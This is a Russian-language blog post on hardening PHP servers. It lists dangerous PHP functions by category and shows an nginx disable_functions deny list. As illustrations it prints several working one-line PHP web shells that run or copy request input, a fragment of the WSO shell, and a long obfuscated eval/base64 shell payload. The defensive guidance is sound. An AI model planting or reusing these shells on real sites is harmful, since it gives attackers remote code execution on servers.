---
layout: post
title: Небезопасные функции PHP
---

Холдинг Modesco — это более 300 инфосайтов и 5 крупных Интернет-сервисов. Проекты регулярно покупаются и продаются. Как вы понимаете, поддерживать качество кода на высоком уровне в данной ситуации физически невозможно. Да и основное внимание программистов, как правило, сосредоточено на самих сервисах. Взломы, shell, заражения сайтов прочими вредоносными штуками… Все это наносит ощутимый вред пользователям и компании. Чтобы избежать этого, частенько приходится искать довольно нестандартные способы для уменьшения рисков.

![_config.yml]({{ site.baseurl }}/images/20191018/y41ajr3cxkkjqkvlzglj3cettwo.jpeg)

В PHP есть небезопасные функции, то есть такие, которые могут использоваться для выполнения произвольного кода или скрывать вредоносный код. Но не стоит сразу бросаться и делать запись в конфиге nginx:

```plaintext
fastcgi_param PHP_VALUE open_basedir="/code/";
fastcgi_param PHP_ADMIN_VALUE disable_functions="exec,expect_popen,mail,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_get_last_error,pcntl_getpriority,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_strerror,pcntl_wait,pcntl_waitpid,pcntl_wexitstatus,pcntl_wifcontinued,pcntl_wifexited,pcntl_wifsignaled,pcntl_wifstopped,pcntl_wstopsig,pcntl_wtermsig,popen,proc_open,shell_exec,system";
```

Это не означает, что все опасные функции срочно надо запретить. Как и не означает, что, запретив их, вы точно обезопасите себя от всех PHP-shell. Большинство этих функций могут абсолютно безопасно использоваться в вашем приложении, Framework или библиотеках. К каждому приложению стоит подходить индивидуально. Безопасность — процесс построения глубоко эшелонированной обороны, и выключение опасных функций в данном случае всего лишь одна из возможных линий этой обороны.

Список таких функций вполне может являться помощником для поиска подозрительных файлов. PHP-shell может быть очень хитро спрятан - отличным примером обфускации служит статья на [habr](https://habr.com/ru/post/193986/)

Статья основана на записи [stackoverflow](https://stackoverflow.com/questions/3115559/exploitable-php-functions/3697776#3697776) и собственном опыте разбора огромного множества [PHP-shell](https://github.com/marcocesarato/PHP-Malware-Collection).

## Что с этим делать

Было бы неплохо выключить некоторые опасные функции для PHP-fpm (или другое). Оставьте возможность для их исполнения только через PHP-cli. Появление других функций стоит мониторить в файлах. К третьим следует относиться более аккуратно и не позволять попадать неочищенным или строго не провалидированным строкам в аргументы.

## Функции исполнения команды

```plaintext
exec
expect_popen
passthru
system
shell_exec
popen
proc_open
pcntl_exec
```

Эти функции стоит выключить в первую очередь. Если они вам нужны в PHP-fpm, то вы делаете что-то не так. Эти функции позволяют выйти из окружения указанном в open_basedir. Выключения только части функций будет недостаточно. Например, любимый многими shell WSO в поисках возможностей для исполнения кода перебирает функции.

```php
function wsoEx($in) {
    $out = '';
    if (function_exists('exec')) {

    } elseif (function_exists('passthru')) {

    } elseif (function_exists('system')) {

    } elseif (function_exists('shell_exec')) {

    } elseif (function_exists('pcntl_exec')) {

    } elseif (function_exists('expect_popen')) {

    } elseif (function_exists('proc_open')) {
   
    } elseif (is_resource($f = @popen($in,"r"))) {

    }
    return $out;
}
```

## Функции управления процессами

```plaintext
pcntl_alarm
pcntl_exec
pcntl_fork
pcntl_get_last_error
pcntl_getpriority
pcntl_setpriority
pcntl_signal
pcntl_signal_dispatch
pcntl_sigprocmask
pcntl_sigtimedwait
pcntl_sigwaitinfo
pcntl_strerror
pcntl_wait
pcntl_waitpid
pcntl_wexitstatus
pcntl_wifcontinued
pcntl_wifexited
pcntl_wifsignaled
pcntl_wifstopped
pcntl_wstopsig
pcntl_wtermsig
```

Их тоже стоит выключить. Например `proc_open` встречается в WSO. Да и не место таким функциям в окружении PHP-fpm. Daemon должны запускаться через PHP-cli.

## Информационные функции

```plaintext
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```

Эти функции раскрывают информацию о вашей системе и могут значительно облегчить осуществление атаки на другой софт. А также могут стать источником утечки конфиденциальных данных, например в [symfony рекомендуется](https://symfony.com/doc/current/configuration/env_var_processors.html#configuring-environment-variables-in-production) хранить подключения к БД в ENV. Поэтому желательно запретить выполнение этих функций, кроме тех, которые используются в вашем приложении.

## Функции выполняющие PHP код

```plaintext
eval
assert
preg_replace
create_function
include
include_once
require
require_once
```

Стоит проверять их наличие в загружаемых файлах и проводить регулярные проверки текущих файлов. Помимо `eval` существуют другие способы выполнить PHP код. Например, можно выполнить include [специально сформированного JPG файла](https://medium.com/@igordata/php-running-jpg-as-php-or-how-to-prevent-execution-of-user-uploaded-files-6ff021897389). Однако большинство framework и приложений используют эти функции - отключать их нельзя. Поэтому важно крайне аккуратно относиться к ним при использовании. Shell может из себя представлять всего лишь одну строку:

```php
 include("data:text/plain;base64,$_GET[code]");
```

## Функции, которые используют callback

```plaintext
ob_start
array_diff_uassoc
array_diff_ukey
array_filter
array_intersect_uassoc
array_intersect_ukey
array_map
array_reduce
array_udiff_assoc
array_udiff_uassoc
array_udiff
array_uintersect_assoc
array_uintersect_uassoc
array_uintersect
array_walk_recursive
array_walk
assert_options
uasort
uksort
usort
preg_replace_callback
spl_autoload_register
iterator_apply
call_user_func
call_user_func_array
register_shutdown_function
register_tick_function
set_error_handler
set_exception_handler
session_set_save_handler
sqlite_create_aggregate
sqlite_create_function
```

Эти функции могут использоваться для вызова других функций через передачу строкового параметра. Стоит применять их аккуратно и не допускать попадания сырых данных в аргументы функции. Ведь они также могут послужить для маскировки shell. Пример самого простого shell с использованием этих функций выглядит так:

```php
print_r(call_user_func_array($_POST['functie'], array($_POST['argv'])));
```

## Функции, часто применяемые в обфускации

```plaintext
eval
assert
str_rot13
base64_decode
gzinflate
gzuncompress
preg_replace
chr
hexdec
decbin
bindec
ord
str_replace
substr
goto
unserialize
trim
rtrim
ltrim
explode
strchr
strstr
chunk_split
strtok
addcslashes
runkit_function_rename
rename_function
call_user_func_array
call_user_func
register_tick_function
register_shutdown_function
```

Эти функции часто применяются для маскировки уже известных PHP-shell от антивирусов и от чужих глаз. Проверяйте на их наличие загружаемые файлы, проводите регулярные проверки в текущих файлах. Пример скрытия shell:

```php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
```

## Функции по работе с файловой системой

```plaintext
fopen
tmpfile
bzopen
gzopen
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng
imagewbmp
image2wbmp
imagejpeg
imagexbm
imagegif
imagegd
imagegd2
iptcembed
ftp_get
ftp_nb_get
file_exists
file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
highlight_file
show_source
php_strip_whitespace
get_meta_tags
```

Эти функции могут быть применены для загрузки файлов или для раскрытия информации о системе — стоит с осторожностью их использовать. Многие PHP-shell умеют загружать сторонние файлы через ftp. Простой PHP-shell для загрузки произвольного файла выглядит так:

```php
copy($_GET['s'], $_GET['d']);
```

## Другие

```plaintext
extract
parse_str  
putenv
ini_set
mail
header
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```

С этими функциями тоже нужна осторожность, а некоторые из них лучше запретить. Например, `mail` может применяться для рассылки спама зараженным сайтом. Если ваше приложение не предполагает использования этих функций, то отключите их. Следующая конструкция не внушает страха, но это один из самых маленьких PHP-shell:

```php
 @extract($_REQUEST); @die ($ctime($atime));
```

## Заключение

Отключение небезопасных PHP-функций — это один из способов уменьшения рисков при нехватки ресурсов. Если вашим проектом займутся люди со "специфическими знаниями" - он, вероятнее всего, падет.

Особенно хорошо такая защита показала себя на сайтах на CMS — их заражают, как правило, вредоносные сети в автоматическом режиме. Если сканирующий бот не сможет запустить команду или залитый PHP shell, он, скорее всего, перейдет к следующему сайту.

Надеюсь, новичков эта статья сподвигнет более внимательно относится к фильтрации, экранированию и валидации данных, полученных от пользователя.

Статья не претендует на уникальные знания - в том или ином виде данный материал уже встречался в Рунете. Текст является обобщенным и систематизированным материалом, призывающим к привлечению внимания к проблеме.

Быть может, кого-то он сможет мотивировать на написание комплексного материала по безопасности Wordpress, ну или другой CMS.
